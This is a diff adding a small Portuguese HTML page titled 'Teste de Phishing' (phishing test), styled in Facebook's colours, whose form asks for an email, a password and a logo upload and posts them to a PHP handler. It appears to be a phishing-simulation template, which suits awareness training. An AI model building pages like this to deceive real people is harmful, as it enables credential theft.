@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Teste de Phishing</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            margin-top: 0;
+            color: #1877f2; /* Azul do Facebook */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #1c1e21; /* Cor padrão do Facebook */
+        }
+
+        input[type="text"],
+        input[type="password"],
+        input[type="file"],
+        button {
+            width: 100%;
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #1877f2; /* Azul do Facebook */
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #166fe5; /* Tom mais escuro de azul */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Teste de Phishing</h2>
+        <form method="POST" action="processar_formulario.php">
+            <label for="email">Email:</label>
+            <input type="text" id="email" name="email" required><br>
+            <label for="senha">Senha:</label>
+            <input type="password" id="senha" name="senha" required><br>
+            <label for="logomarca">Logomarca (200x350 pixels):</label>
+            <input type="file" id="logomarca" name="logomarca" accept="image/*" required><br>
+            <button type="submit">Enviar</button>
+        </form>
+    </div>
+</body>
+</html>
